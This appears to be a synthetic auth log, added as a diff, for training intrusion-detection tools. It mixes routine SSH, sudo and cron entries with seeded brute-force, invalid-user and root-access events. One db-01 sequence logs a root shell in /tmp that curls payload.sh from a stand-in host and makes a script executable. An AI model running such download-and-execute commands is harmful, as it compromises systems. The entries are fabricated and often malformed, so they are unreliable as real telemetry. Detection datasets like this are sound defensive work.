@@ -1,0 +1,903 @@
+# SYNTHETIC TRAINING DATASET — generated for defensive IDS/log-analyzer development
+# All public-looking IPs use documentation ranges (RFC 5737); no real users or systems are represented.
+# Time range: 2026-10-20 through 2026-10-22 UTC. Mixed normal activity and seeded detection scenarios.
+# Suggested detections: brute force, password spraying, success-after-failures, root/admin access,
+# privilege escalation, invalid users, off-hours access, service-account login, and log tampering clues.
+Oct 20 00:00:00 bastion-01 systemd-logind: sshd[18410]: Accepted publickey for tunde from 10.0.8.9 port 56079 ssh2: ED25519 SHA256:Qc506jZuWc4iHJ0g
+Oct 20 00:00:51 bastion-01 polkitd: sshd[13557]: Failed password for root from 172.16.5.12 port 49441 ssh2
+Oct 20 00:11:29 api-01 cron: sshd[27317]: Failed password for svc_api from 198.51.100.23 port 47406 ssh2
+Oct 20 00:12:14 bastion-01 cron: sudo[10132]: chioma : TTY=pts/2 ; PWD=/home/chioma ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 20 00:21:16 db-01 sshd: systemd-logind[25899]: New session 238 of user ifeoma.
+Oct 20 00:25:40 worker-02 sudo: systemd-logind[11242]: New session 251 of user ngozi.
+Oct 20 00:26:29 web-01 systemd-logind: sudo[27087]: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 20 00:32:12 auth-gw-01 sudo: sshd[10228]: Accepted publickey for ngozi from 198.51.100.23 port 50616 ssh2: ED25519 SHA256:lksnKpsVq0ruFeIN
+Oct 20 00:39:29 worker-02 su: systemd-logind[13567]: New session 196 of user kunle.
+Oct 20 00:43:38 web-01 sshd: sshd[18509]: Accepted publickey for ada from 198.51.100.44 port 58128 ssh2: ED25519 SHA256:YeSixyrdxg7ctCOr
+Oct 20 00:47:35 bastion-01 sudo: systemd-logind[24815]: New session 485 of user admin.
+Oct 20 00:52:19 api-01 polkitd: sshd[16241]: Accepted publickey for ada from 10.0.4.22 port 47788 ssh2: ED25519 SHA256:XGgbbojwuRW7MBbg
+Oct 20 00:55:10 bastion-01 polkitd: sshd[7397]: Failed password for svc_api from 192.168.1.31 port 60350 ssh2
+Oct 20 00:56:28 db-01 sshd: systemd-logind[13440]: New session 140 of user kunle.
+Oct 20 00:56:37 worker-02 sshd: sshd[23484]: Accepted publickey for fatima from 10.0.8.9 port 61825 ssh2: ED25519 SHA256:e1OaQZ3njnq9jRjO
+Oct 20 00:58:01 web-01 polkitd: sshd[10263]: Accepted publickey for backup from 10.0.4.22 port 58462 ssh2: ED25519 SHA256:8gyIEaHbv6rvqKPm
+Oct 20 00:59:33 worker-02 systemd-logind: sshd[6916]: Accepted publickey for backup from 172.16.5.12 port 31917 ssh2: ED25519 SHA256:FvhCORgiPCGH7n0O
+Oct 20 01:04:31 bastion-01 su: CRON[21166]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 20 01:13:21 db-01 systemd-logind: sshd[18502]: Accepted publickey for kunle from 192.168.1.31 port 45808 ssh2: ED25519 SHA256:jDGc5iZt375LrcXh
+Oct 20 01:15:24 db-01 sshd: systemd-logind[5967]: New session 183 of user emeka.
+Oct 20 01:25:26 auth-gw-01 sudo: sshd[20314]: Accepted publickey for ada from 172.16.5.12 port 49886 ssh2: ED25519 SHA256:UhwSSn9CFjDhpBbO
+Oct 20 01:25:52 web-01 sshd: sshd[17461]: Failed password for svc_api from 198.51.100.23 port 63004 ssh2
+Oct 20 01:29:49 web-01 cron: sshd[23429]: Accepted publickey for ada from 198.51.100.23 port 36165 ssh2: ED25519 SHA256:YBxaPz6jBAm6vYR9
+Oct 20 01:32:00 web-01 sudo: systemd-logind[28646]: New session 298 of user kunle.
+Oct 20 01:33:56 api-01 sshd: sshd[20196]: Accepted publickey for amara from 10.0.2.15 port 42067 ssh2: ED25519 SHA256:lLYqjdJPgxeHiP4e
+Oct 20 01:39:20 worker-02 polkitd: sudo[8971]: amara : TTY=pts/4 ; PWD=/home/amara ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 20 01:39:45 auth-gw-01 polkitd: sudo[18857]: bayo : TTY=pts/1 ; PWD=/home/bayo ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 20 01:42:13 api-01 sshd: sshd[6117]: Accepted publickey for amara from 198.51.100.44 port 61517 ssh2: ED25519 SHA256:eg0vmlIYoK0halu7
+Oct 20 01:47:09 api-01 su: sshd[9195]: Failed password for admin from 10.0.2.15 port 60329 ssh2
+Oct 20 01:49:54 worker-02 su: CRON[26373]: (root) CMD (/usr/local/bin/rotate-logs)
+Oct 20 01:50:58 worker-02 systemd-logind: sshd[11815]: Failed password for emeka from 203.0.113.17 port 37372 ssh2
+Oct 20 01:51:15 auth-gw-01 sshd: sshd[18542]: Accepted publickey for ifeoma from 172.16.5.12 port 31926 ssh2: ED25519 SHA256:rCwXCJohWwzOCCmA
+Oct 20 02:06:16 web-01 sshd: sshd[5637]: Accepted publickey for tunde from 172.16.5.12 port 55177 ssh2: ED25519 SHA256:UwhDvmNjJwPc42lL
+Oct 20 02:14:00 db-01 sshd[15001]: Accepted publickey for admin from 203.0.113.17 port 50112 ssh2: ED25519 SHA256:K4pQm7wZ9rT2nV6x
+Oct 20 02:14:38 db-01 sudo[15002]: admin : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Oct 20 02:16:00 db-01 sudo[15003]: admin : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -fsS http://203.0.113.149/payload.sh
+Oct 20 02:16:49 db-01 sshd: CRON[16311]: (backup) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 02:17:00 db-01 sudo[15004]: admin : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/maintenance.sh
+Oct 20 02:23:41 api-01 systemd-logind: sshd[5751]: Failed password for ifeoma from 192.168.1.24 port 47771 ssh2
+Oct 20 02:24:52 web-01 sshd: sshd[18946]: Accepted publickey for ngozi from 10.0.4.22 port 39358 ssh2: ED25519 SHA256:TLoKQ0n90HQr8Ggz
+Oct 20 02:28:38 worker-02 systemd-logind: sudo[19310]: fatima : TTY=pts/0 ; PWD=/home/fatima ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 20 02:30:36 worker-02 sudo: sshd[15050]: Accepted publickey for deploy from 192.168.1.31 port 61842 ssh2: ED25519 SHA256:NKDQlA2sRIv3thOt
+Oct 20 02:34:17 auth-gw-01 sudo: sshd[28745]: Failed password for amara from 10.0.4.22 port 47805 ssh2
+Oct 20 02:35:11 db-01 sudo: sshd[5179]: Failed password for ada from 10.0.8.9 port 49115 ssh2
+Oct 20 02:37:20 web-01 su: sshd[14316]: Accepted publickey for ifeoma from 198.51.100.23 port 63669 ssh2: ED25519 SHA256:BE5Y7D27guiQ1nRR
+Oct 20 02:43:14 web-01 cron: sshd[14003]: Failed password for emeka from 192.168.1.24 port 64686 ssh2
+Oct 20 02:47:01 web-01 sshd: sudo[18396]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 02:47:50 web-01 sshd: sshd[19664]: Accepted publickey for chioma from 172.16.5.12 port 59200 ssh2: ED25519 SHA256:XyRTTUjteyuik0hg
+Oct 20 02:48:05 bastion-01 sudo: sshd[28621]: Accepted publickey for ngozi from 172.16.5.12 port 54360 ssh2: ED25519 SHA256:HGnRCJP0PiiUrnk5
+Oct 20 02:50:33 bastion-01 sudo: systemd-logind[16706]: New session 188 of user admin.
+Oct 20 02:53:59 auth-gw-01 su: sshd[10030]: Accepted publickey for ngozi from 192.168.1.24 port 53432 ssh2: ED25519 SHA256:weiM2AlB2tm72bQh
+Oct 20 02:56:48 api-01 cron: sudo[26653]: chioma : TTY=pts/1 ; PWD=/home/chioma ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 20 03:05:18 web-01 sudo: sshd[15706]: Accepted publickey for bayo from 172.16.5.12 port 54075 ssh2: ED25519 SHA256:CVaH5W62lRmHRgWB
+Oct 20 03:09:12 db-01 sshd: sudo[9700]: fatima : TTY=pts/4 ; PWD=/home/fatima ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 03:13:15 auth-gw-01 systemd-logind: sshd[23159]: Accepted publickey for admin from 198.51.100.23 port 31324 ssh2: ED25519 SHA256:uJYodR6ZhWau15vF
+Oct 20 03:23:03 worker-02 cron: sshd[8941]: Accepted publickey for bayo from 10.0.4.22 port 43653 ssh2: ED25519 SHA256:HPmbVun2HZtCn84H
+Oct 20 03:24:28 api-01 cron: systemd-logind[19792]: New session 423 of user sani.
+Oct 20 03:26:01 web-01 cron: sshd[18004]: Accepted publickey for emeka from 198.51.100.23 port 62633 ssh2: ED25519 SHA256:eFknVLSLYSyfFSNi
+Oct 20 03:32:04 bastion-01 polkitd: sshd[23352]: Accepted publickey for kunle from 10.0.4.22 port 60588 ssh2: ED25519 SHA256:QPDzblVARqJPVWRC
+Oct 20 03:34:39 bastion-01 systemd-logind: sshd[28999]: Accepted publickey for ngozi from 203.0.113.17 port 37617 ssh2: ED25519 SHA256:jqViTQ1Z8qrRrzbj
+Oct 20 03:34:54 bastion-01 polkitd: systemd-logind[7927]: New session 297 of user amara.
+Oct 20 03:37:18 bastion-01 cron: sshd[22945]: Accepted publickey for backup from 192.168.1.24 port 62002 ssh2: ED25519 SHA256:jj1K3YpealubPxOw
+Oct 20 03:38:05 api-01 systemd-logind: sshd[16069]: Accepted publickey for backup from 192.168.1.24 port 61412 ssh2: ED25519 SHA256:YAO405TL4oHZVEOt
+Oct 20 03:49:07 worker-02 sudo: sshd[25751]: Accepted publickey for deploy from 198.51.100.23 port 40808 ssh2: ED25519 SHA256:jDa8d7RXxU9HU7IP
+Oct 20 03:51:38 worker-02 sshd: sshd[15333]: Accepted publickey for svc_api from 10.0.2.15 port 44140 ssh2: ED25519 SHA256:Vk0QDkKs6qnDOH1C
+Oct 20 03:55:29 bastion-01 systemd-logind: sshd[20073]: Accepted publickey for ifeoma from 10.0.4.22 port 58115 ssh2: ED25519 SHA256:7isSr7a1k79oxeI1
+Oct 20 04:01:17 api-01 cron: sshd[13202]: Failed password for sani from 10.0.2.15 port 38472 ssh2
+Oct 20 04:09:38 web-01 sudo: sshd[28832]: Accepted publickey for root from 10.0.4.22 port 40743 ssh2: ED25519 SHA256:87haCz7aPNd5zNrY
+Oct 20 04:10:06 worker-02 sshd: CRON[2629]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 20 04:12:09 api-01 polkitd: sshd[16665]: Accepted publickey for emeka from 192.168.1.24 port 51139 ssh2: ED25519 SHA256:fAXIOGhrTltTMq6g
+Oct 20 04:15:01 db-01 su: sshd[18154]: Accepted publickey for ngozi from 198.51.100.44 port 41972 ssh2: ED25519 SHA256:dBzpv7QbXJrbQgTU
+Oct 20 04:15:52 db-01 sshd: sshd[28413]: Accepted publickey for kunle from 10.0.2.15 port 32223 ssh2: ED25519 SHA256:L5ztJPXGEelFLQWr
+Oct 20 04:16:29 api-01 su: sudo[15751]: svc_api : TTY=pts/5 ; PWD=/home/svc_api ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 04:17:51 worker-02 su: systemd-logind[6614]: New session 204 of user bayo.
+Oct 20 04:33:48 db-01 polkitd: sshd[14760]: Accepted publickey for sani from 203.0.113.17 port 52207 ssh2: ED25519 SHA256:Nw3jmaz3RGZMVQQA
+Oct 20 04:45:02 api-01 su: sshd[22289]: Accepted publickey for emeka from 10.0.2.15 port 32354 ssh2: ED25519 SHA256:NCNfEWJKMmzGukny
+Oct 20 04:51:01 api-01 cron: sshd[27813]: Invalid user oracle from 203.0.113.17 port 62302
+Oct 20 04:52:23 api-01 cron: sshd[6914]: Accepted publickey for kunle from 198.51.100.23 port 41828 ssh2: ED25519 SHA256:XYtJsfiqf40ot4MM
+Oct 20 04:52:56 bastion-01 su: sshd[7945]: Failed password for chioma from 172.16.5.12 port 46893 ssh2
+Oct 20 04:57:22 web-01 polkitd: sshd[16146]: Accepted publickey for emeka from 10.0.4.22 port 50479 ssh2: ED25519 SHA256:nQ4L5IzB0opJ4ENO
+Oct 20 05:06:44 db-01 cron: sudo[7149]: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 20 05:07:19 auth-gw-01 cron: sshd[9117]: Accepted publickey for ada from 192.168.1.31 port 50130 ssh2: ED25519 SHA256:v2zhTMBZip4wI5av
+Oct 20 05:15:16 bastion-01 sshd: CRON[9371]: (root) CMD (/usr/local/bin/health-check)
+Oct 20 05:15:16 api-01 polkitd: systemd-logind[26542]: New session 278 of user root.
+Oct 20 05:16:22 worker-02 sudo: sshd[8626]: Accepted publickey for svc_api from 198.51.100.44 port 32741 ssh2: ED25519 SHA256:lbJeqPHNJVXoZj0L
+Oct 20 05:19:35 bastion-01 cron: sshd[988]: Accepted publickey for emeka from 10.0.2.15 port 30235 ssh2: ED25519 SHA256:IwE10sN1YadePnMy
+Oct 20 05:20:45 bastion-01 sudo: sshd[15403]: Accepted publickey for admin from 10.0.8.9 port 42125 ssh2: ED25519 SHA256:XCLijPp0YWHNRlZr
+Oct 20 05:22:16 db-01 sudo: sshd[26486]: Accepted publickey for sani from 10.0.4.22 port 59834 ssh2: ED25519 SHA256:n7hldLYu6amcNH1v
+Oct 20 05:25:20 auth-gw-01 su: sudo[14881]: sani : TTY=pts/2 ; PWD=/home/sani ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 05:28:19 db-01 polkitd: sshd[2499]: Accepted publickey for fatima from 10.0.2.15 port 64366 ssh2: ED25519 SHA256:2BEgBrq4uV5eoIwn
+Oct 20 05:28:26 web-01 sshd: sshd[23738]: Failed password for tunde from 198.51.100.44 port 61892 ssh2
+Oct 20 05:28:39 api-01 su: sudo[10776]: ngozi : TTY=pts/2 ; PWD=/home/ngozi ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 05:28:43 auth-gw-01 sudo: systemd-logind[27563]: New session 393 of user admin.
+Oct 20 05:32:55 api-01 cron: sshd[7490]: Accepted publickey for kunle from 198.51.100.44 port 42355 ssh2: ED25519 SHA256:HVDKbymXWiAL91cP
+Oct 20 05:33:27 auth-gw-01 polkitd: sudo[19449]: tunde : TTY=pts/2 ; PWD=/home/tunde ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 20 05:33:58 db-01 sudo: systemd-logind[7574]: New session 197 of user fatima.
+Oct 20 05:38:56 db-01 sshd: systemd-logind[17396]: New session 444 of user emeka.
+Oct 20 05:40:36 db-01 sshd: sshd[16506]: Accepted publickey for root from 10.0.2.15 port 48923 ssh2: ED25519 SHA256:3Gwpk5GdZO1dzVQa
+Oct 20 05:56:04 bastion-01 polkitd: sshd[28940]: Failed password for backup from 10.0.4.22 port 41322 ssh2
+Oct 20 06:06:06 worker-02 polkitd: systemd-logind[7690]: New session 263 of user root.
+Oct 20 06:06:27 worker-02 systemd-logind: sshd[7951]: Accepted publickey for ngozi from 198.51.100.44 port 42062 ssh2: ED25519 SHA256:d3Z3N43etO5lWSBu
+Oct 20 06:09:30 worker-02 polkitd: systemd-logind[7444]: New session 389 of user root.
+Oct 20 06:10:16 db-01 sudo: sshd[11794]: Accepted publickey for chioma from 172.16.5.12 port 52594 ssh2: ED25519 SHA256:G0BdQHZu6JFyKnWS
+Oct 20 06:11:12 bastion-01 su: sshd[13488]: Failed password for fatima from 172.16.5.12 port 38905 ssh2
+Oct 20 06:14:34 auth-gw-01 sshd: sshd[19639]: Accepted publickey for tunde from 198.51.100.44 port 51598 ssh2: ED25519 SHA256:tLtFdlMnsQfeObEV
+Oct 20 06:16:53 worker-02 sshd: sshd[1869]: Failed password for svc_api from 198.51.100.23 port 42406 ssh2
+Oct 20 06:29:58 web-01 su: sshd[17004]: Accepted publickey for admin from 172.16.5.12 port 47502 ssh2: ED25519 SHA256:QXQ1fKI59tpvy69U
+Oct 20 06:31:11 web-01 polkitd: sshd[12491]: Accepted publickey for bayo from 198.51.100.23 port 49988 ssh2: ED25519 SHA256:K8DLcirzDWoKvMqZ
+Oct 20 06:36:12 api-01 polkitd: sshd[6347]: Accepted publickey for chioma from 192.168.1.24 port 40983 ssh2: ED25519 SHA256:FSUoP5Sam49NuhHL
+Oct 20 06:38:20 db-01 sshd: sshd[24711]: Accepted publickey for chioma from 10.0.4.22 port 48364 ssh2: ED25519 SHA256:QhPZeZYGXZIup77f
+Oct 20 06:40:09 auth-gw-01 sudo: sshd[13000]: Accepted publickey for sani from 198.51.100.44 port 53001 ssh2: ED25519 SHA256:LCICvyOozOx5t1zJ
+Oct 20 06:43:58 bastion-01 su: sshd[4327]: Accepted publickey for backup from 203.0.113.17 port 39687 ssh2: ED25519 SHA256:HY9FkDItrivhM0uB
+Oct 20 06:46:33 bastion-01 cron: sshd[8078]: Invalid user oracle1 from 10.0.2.15 port 39740
+Oct 20 06:54:43 auth-gw-01 su: sshd[6243]: Accepted publickey for backup from 172.16.5.12 port 42832 ssh2: ED25519 SHA256:UhBekP7HtLYLTW0b
+Oct 20 06:55:15 api-01 su: sshd[19576]: Accepted publickey for ada from 192.168.1.24 port 38295 ssh2: ED25519 SHA256:lzVQYKKzXVDRoXHx
+Oct 20 06:56:29 worker-02 sudo: sshd[2815]: Accepted publickey for ifeoma from 10.0.2.15 port 37221 ssh2: ED25519 SHA256:NYAJ9kJuj2X2JKNV
+Oct 20 06:59:11 web-01 sshd: sshd[1423]: Failed password for emeka from 10.0.8.9 port 39352 ssh2
+Oct 20 07:11:11 auth-gw-01 sudo: sudo[25315]: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 20 07:11:11 web-01 sudo: sshd[15267]: Accepted publickey for amara from 192.168.1.31 port 41994 ssh2: ED25519 SHA256:5SdXo1cBd4xv7LVQ
+Oct 20 07:12:03 bastion-01 sshd[12000]: Failed password for emeka from 198.51.100.23 port 41000 ssh2
+Oct 20 07:12:14 bastion-01 sshd[12001]: Failed password for emeka from 198.51.100.23 port 41001 ssh2
+Oct 20 07:12:24 bastion-01 sshd[12002]: Failed password for emeka from 198.51.100.23 port 41002 ssh2
+Oct 20 07:12:36 bastion-01 sshd[12003]: Failed password for emeka from 198.51.100.23 port 41003 ssh2
+Oct 20 07:12:47 bastion-01 sshd[12004]: Failed password for emeka from 198.51.100.23 port 41004 ssh2
+Oct 20 07:12:56 bastion-01 sshd[12005]: Failed password for emeka from 198.51.100.23 port 41005 ssh2
+Oct 20 07:13:07 bastion-01 sshd[12006]: Failed password for emeka from 198.51.100.23 port 41006 ssh2
+Oct 20 07:13:19 bastion-01 sshd[12007]: Failed password for emeka from 198.51.100.23 port 41007 ssh2
+Oct 20 07:13:29 bastion-01 sshd[12008]: Failed password for emeka from 198.51.100.23 port 41008 ssh2
+Oct 20 07:13:40 bastion-01 sshd[12009]: Failed password for emeka from 198.51.100.23 port 41009 ssh2
+Oct 20 07:13:50 bastion-01 sshd[12010]: Failed password for emeka from 198.51.100.23 port 41010 ssh2
+Oct 20 07:14:03 bastion-01 sshd[12011]: Failed password for emeka from 198.51.100.23 port 41011 ssh2
+Oct 20 07:14:15 bastion-01 sshd[12012]: Failed password for emeka from 198.51.100.23 port 41012 ssh2
+Oct 20 07:14:24 bastion-01 sshd[12013]: Failed password for emeka from 198.51.100.23 port 41013 ssh2
+Oct 20 07:14:35 bastion-01 sshd[12014]: Failed password for emeka from 198.51.100.23 port 41014 ssh2
+Oct 20 07:14:47 bastion-01 sshd[12015]: Failed password for emeka from 198.51.100.23 port 41015 ssh2
+Oct 20 07:14:59 bastion-01 sshd[12016]: Failed password for emeka from 198.51.100.23 port 41016 ssh2
+Oct 20 07:15:07 bastion-01 sshd[12017]: Failed password for emeka from 198.51.100.23 port 41017 ssh2
+Oct 20 07:15:18 bastion-01 sshd[12018]: Failed password for emeka from 198.51.100.23 port 41018 ssh2
+Oct 20 07:15:31 bastion-01 sshd[12019]: Failed password for emeka from 198.51.100.23 port 41019 ssh2
+Oct 20 07:15:41 bastion-01 sshd[12020]: Failed password for emeka from 198.51.100.23 port 41020 ssh2
+Oct 20 07:15:51 bastion-01 sshd[12021]: Failed password for emeka from 198.51.100.23 port 41021 ssh2
+Oct 20 07:16:05 bastion-01 sshd[12022]: Failed password for emeka from 198.51.100.23 port 41022 ssh2
+Oct 20 07:16:16 bastion-01 sshd[12023]: Failed password for emeka from 198.51.100.23 port 41023 ssh2
+Oct 20 07:16:25 bastion-01 sshd[12024]: Failed password for emeka from 198.51.100.23 port 41024 ssh2
+Oct 20 07:16:37 bastion-01 sshd[12025]: Failed password for emeka from 198.51.100.23 port 41025 ssh2
+Oct 20 07:16:46 bastion-01 sshd[12026]: Failed password for emeka from 198.51.100.23 port 41026 ssh2
+Oct 20 07:16:57 bastion-01 sshd[12027]: Failed password for emeka from 198.51.100.23 port 41027 ssh2
+Oct 20 07:17:08 bastion-01 sshd[12028]: Failed password for emeka from 198.51.100.23 port 41028 ssh2
+Oct 20 07:17:21 bastion-01 sshd[12029]: Failed password for emeka from 198.51.100.23 port 41029 ssh2
+Oct 20 07:17:30 bastion-01 sshd[12030]: Failed password for emeka from 198.51.100.23 port 41030 ssh2
+Oct 20 07:17:44 bastion-01 sshd[12031]: Failed password for emeka from 198.51.100.23 port 41031 ssh2
+Oct 20 07:18:59 worker-02 systemd-logind: CRON[22298]: (svc_api) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 20 07:20:14 worker-02 polkitd: sshd[24377]: Accepted publickey for sani from 10.0.4.22 port 30036 ssh2: ED25519 SHA256:I6xhgtWLqSBA59vh
+Oct 20 07:21:52 api-01 su: systemd-logind[12755]: New session 277 of user root.
+Oct 20 07:23:12 bastion-01 sudo: sshd[24517]: Accepted publickey for bayo from 198.51.100.23 port 45920 ssh2: ED25519 SHA256:2kzZp9dkvFeYawuH
+Oct 20 07:24:25 db-01 cron: CRON[24695]: (root) CMD (/usr/local/bin/rotate-logs)
+Oct 20 07:28:58 bastion-01 systemd-logind: sshd[24472]: Failed password for bayo from 10.0.4.22 port 53892 ssh2
+Oct 20 07:32:12 worker-02 systemd-logind: sshd[1685]: Failed password for root from 10.0.8.9 port 46750 ssh2
+Oct 20 07:35:31 bastion-01 sudo: sshd[18015]: Accepted publickey for tunde from 192.168.1.31 port 37896 ssh2: ED25519 SHA256:an6BYxv4zzXnqb5j
+Oct 20 07:40:19 worker-02 cron: sshd[19643]: Accepted publickey for svc_api from 10.0.4.22 port 33677 ssh2: ED25519 SHA256:99s0kFkuoaWsPvoT
+Oct 20 07:41:51 auth-gw-01 sshd: sshd[12226]: Accepted publickey for sani from 192.168.1.31 port 58604 ssh2: ED25519 SHA256:hTjL9amaNnSPvRRf
+Oct 20 07:43:19 db-01 sshd: sshd[28360]: Failed password for ngozi from 198.51.100.23 port 42642 ssh2
+Oct 20 07:52:15 worker-02 sshd: sshd[14712]: Accepted publickey for bayo from 10.0.4.22 port 37088 ssh2: ED25519 SHA256:wBjpo5NTqwZ2VPfW
+Oct 20 07:58:30 worker-02 sshd: sshd[21178]: Accepted publickey for ada from 192.168.1.24 port 41764 ssh2: ED25519 SHA256:zULZAoOqLnejSTOh
+Oct 20 07:58:49 db-01 systemd-logind: sshd[16969]: Invalid user user1 from 192.168.1.31 port 32513
+Oct 20 07:59:38 web-01 systemd-logind: sshd[22072]: Accepted publickey for bayo from 198.51.100.44 port 64749 ssh2: ED25519 SHA256:AUrLdkpuxcU4QcuS
+Oct 20 08:01:11 auth-gw-01 polkitd: sshd[21324]: Invalid user administrator from 172.16.5.12 port 55102
+Oct 20 08:13:44 api-01 sshd: sshd[10631]: Failed password for svc_api from 203.0.113.17 port 30735 ssh2
+Oct 20 08:21:50 api-01 cron: sshd[22463]: Accepted publickey for svc_api from 192.168.1.31 port 56119 ssh2: ED25519 SHA256:77yfmiCKL0CwoXRk
+Oct 20 08:22:58 db-01 systemd-logind: sshd[9842]: Accepted publickey for backup from 203.0.113.17 port 45589 ssh2: ED25519 SHA256:EitIwNNMGt33kEtT
+Oct 20 08:38:05 web-01 cron: sshd[19836]: Accepted publickey for sani from 10.0.8.9 port 56285 ssh2: ED25519 SHA256:nkq9vO1zcIFfvF6q
+Oct 20 08:39:43 bastion-01 sudo: CRON[24541]: (backup) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 08:39:54 worker-02 sshd: sshd[12875]: Accepted publickey for backup from 10.0.2.15 port 49022 ssh2: ED25519 SHA256:aR3NfepprYt5gef3
+Oct 20 08:44:25 auth-gw-01 systemd-logind: CRON[24624]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 20 08:49:34 db-01 sshd: sshd[26848]: Accepted publickey for ngozi from 203.0.113.17 port 57658 ssh2: ED25519 SHA256:qUa3Pqljp3E6zm3G
+Oct 20 08:52:15 auth-gw-01 systemd-logind: sshd[1680]: Accepted publickey for kunle from 10.0.2.15 port 56540 ssh2: ED25519 SHA256:tQYOQJLdLCyJ4UDE
+Oct 20 08:52:21 bastion-01 su: sshd[28951]: Failed password for backup from 198.51.100.23 port 51708 ssh2
+Oct 20 09:04:00 db-01 sshd: sshd[28407]: Accepted publickey for chioma from 10.0.8.9 port 37885 ssh2: ED25519 SHA256:h42QcoCNFEPxxF1T
+Oct 20 09:07:23 auth-gw-01 cron: sshd[2021]: Failed password for chioma from 203.0.113.17 port 48772 ssh2
+Oct 20 09:09:01 auth-gw-01 systemd-logind: sshd[9977]: Failed password for sani from 10.0.8.9 port 35665 ssh2
+Oct 20 09:10:46 auth-gw-01 sshd: sshd[1801]: Accepted publickey for deploy from 10.0.4.22 port 61074 ssh2: ED25519 SHA256:kwRe7f0vNoxGyf3R
+Oct 20 09:21:32 web-01 sudo: sshd[27089]: Failed password for bayo from 198.51.100.44 port 48578 ssh2
+Oct 20 09:24:10 web-01 polkitd: sshd[15614]: Accepted publickey for amara from 10.0.8.9 port 45992 ssh2: ED25519 SHA256:4SgecUFu3bY6Ajbt
+Oct 20 09:24:40 worker-02 systemd-logind: sshd[23477]: Accepted publickey for fatima from 198.51.100.23 port 49738 ssh2: ED25519 SHA256:4atp286av9Al0WK4
+Oct 20 09:26:01 api-01 su: sudo[12854]: sani : TTY=pts/2 ; PWD=/home/sani ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 09:29:08 worker-02 sshd: sudo[28576]: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 09:39:47 db-01 systemd-logind: CRON[6434]: (backup) CMD (/usr/local/bin/rotate-logs)
+Oct 20 09:43:45 auth-gw-01 sshd: sshd[27735]: Failed password for bayo from 198.51.100.44 port 50411 ssh2
+Oct 20 09:50:53 auth-gw-01 sshd: CRON[11875]: (root) CMD (/usr/local/bin/rotate-logs)
+Oct 20 09:52:30 worker-02 sshd: sshd[21034]: Accepted publickey for ada from 192.168.1.31 port 46203 ssh2: ED25519 SHA256:6VHdbF0XqBW92Vw5
+Oct 20 09:58:02 bastion-01 cron: sshd[24544]: Accepted publickey for root from 10.0.2.15 port 53217 ssh2: ED25519 SHA256:dnJApSeZz4hbb4ZS
+Oct 20 10:03:00 db-01 polkitd: sshd[14273]: Accepted publickey for kunle from 172.16.5.12 port 32963 ssh2: ED25519 SHA256:iPhKbbPSloOrjwuC
+Oct 20 10:03:34 db-01 su: sshd[11743]: Accepted publickey for amara from 172.16.5.12 port 40250 ssh2: ED25519 SHA256:FHfxmJET2Nii7fRu
+Oct 20 10:05:16 web-01 su: sshd[27878]: Accepted publickey for sani from 10.0.8.9 port 30932 ssh2: ED25519 SHA256:PaGkL7lwY4PrK9N5
+Oct 20 10:07:06 db-01 polkitd: sshd[20985]: Accepted publickey for backup from 192.168.1.31 port 43887 ssh2: ED25519 SHA256:nDfXNW8rQIS02Wyc
+Oct 20 10:08:54 auth-gw-01 su: sshd[13291]: Accepted publickey for backup from 192.168.1.31 port 38084 ssh2: ED25519 SHA256:Bm1jAhureex1bioE
+Oct 20 10:14:42 bastion-01 systemd-logind: sshd[23170]: Accepted publickey for ngozi from 203.0.113.17 port 37868 ssh2: ED25519 SHA256:bTEk45X7fuCrKuEh
+Oct 20 10:14:44 db-01 sudo: sshd[22550]: Accepted publickey for bayo from 172.16.5.12 port 53919 ssh2: ED25519 SHA256:DqEUvyb9IrOjOZpL
+Oct 20 10:19:17 auth-gw-01 sshd: sshd[12670]: Failed password for svc_api from 192.168.1.31 port 42042 ssh2
+Oct 20 10:30:43 db-01 su: sshd[12361]: Accepted publickey for ngozi from 192.168.1.31 port 42196 ssh2: ED25519 SHA256:zZT6xUnL2SGrLgrX
+Oct 20 10:40:06 web-01 polkitd: sshd[24694]: Failed password for fatima from 198.51.100.44 port 62579 ssh2
+Oct 20 10:43:00 worker-02 sudo: sshd[19838]: Accepted publickey for root from 192.168.1.31 port 51959 ssh2: ED25519 SHA256:hirdGjeOUwVpkgxV
+Oct 20 10:44:24 api-01 polkitd: sshd[14005]: Failed password for tunde from 10.0.2.15 port 38071 ssh2
+Oct 20 10:46:15 db-01 sudo: CRON[20141]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 10:52:56 auth-gw-01 sshd: CRON[13135]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 20 10:58:41 web-01 systemd-logind: sudo[28700]: backup : TTY=pts/5 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/apt-get update
